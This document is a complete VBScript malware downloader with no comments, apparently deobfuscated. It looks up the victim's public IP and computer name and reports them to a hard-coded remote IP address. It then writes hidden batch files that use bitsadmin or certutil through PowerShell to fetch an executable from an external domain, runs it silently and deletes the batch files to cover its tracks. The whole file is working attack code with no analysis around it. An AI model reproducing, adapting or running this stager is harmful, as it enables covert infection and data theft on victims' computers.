var_url_1 = "https://tymeforchange.com/acunamatata/"
var_1 = "download"
var_2 = "execute"
path_1 = "C:\Users\Public\Documents\"
path_2 = "C:\Users\Public\Downloads\"
path_3 = "%appdata%\"
executable_file = "YiPEPyqBQLEHe.exe"
var_3 = "powershell"

set xml_http_request = CreateObject("MSXML2.XMLHTTP")
xml_http_request.open "GET", "https://api.ipify.org", False
xml_http_request.send
response_text_http = xml_http_request.responseText

dim user_computer_name, var_url_2

Set WshNetwork = WScript.CreateObject("WScript.Network")
user_computer_name= WshNetwork.Computername
var_url_2= "http://195.123.247.39:8080/data/" & response_text_http & "/" & user_computer_name
Set recordStat = CreateObject("MSXML2.XMLHTTP")
recordStat.open "GET",var_url_2, False
recordStat.send

Set var_file_system_object = CreateObject("Scripting.FileSystemObject")
Set var_WScript_shell_1 = CreateObject("WScript.Shell")
Set var_WScript_shell_2 = CreateObject("WScript.Shell")

var_WScript_shell_1.CurrentDirectory = "C:\Users\Public\Documents\"

If Not var_file_system_object.FileExists("C:\Users\Public\Documents\download.bat") Then
	
	Set text_stream_object_of_file=var_file_system_object.CreateTextFile("C:\Users\Public\Documents\download.bat",True)
	
	dim random_one_or_two
	Randomize
	random_one_or_two = int(Rnd * 2) + 1
	select case random_one_or_two
		case 1
			text_stream_object_of_file.Write "powershell" & "  -NoP -c ""&{bitsadmin / transfer elrxhnpf" & "https://tymeforchange.com/acunamatata/" & " " & "%appdata%\" & executable_file & ";}"""
		case 2
			text_stream_object_of_file.Write "powershell" & " -NoP -c ""&{certutil.exe -urlcache -split -f" & "https://tymeforchange.com/acunamatata/" & " " & "%appdata%\" & executable_file & ";}"""
	end select
	
	text_stream_object_of_file.Close
	
	var_WScript_shell_1.run "C:\Users\Public\Documents\download.bat", 0, 1
End If

var_WScript_shell_2.CurrentDirectory= "C:\Users\Public\Downloads\"

If Not var_file_system_object.FileExists("C:\Users\Public\Downloads\" & "execute" & ".bat") Then

	Set text_stream_object_of_file_2=var_file_system_object.CreateTextFile("C:\Users\Public\Downloads\" & "execute" & ".bat",True)
	text_stream_object_of_file_2.Write "%appdata%\" & executable_file
	text_stream_object_of_file_2.Close
	
	var_WScript_shell_2.run "execute" & ".bat", 0, 1
End If

var_file_system_object.DeleteFile("C:\Users\Public\Documents\" & "download" & ".bat")
var_file_system_object.DeleteFile("C:\Users\Public\Downloads\" & "execute" & ".bat")
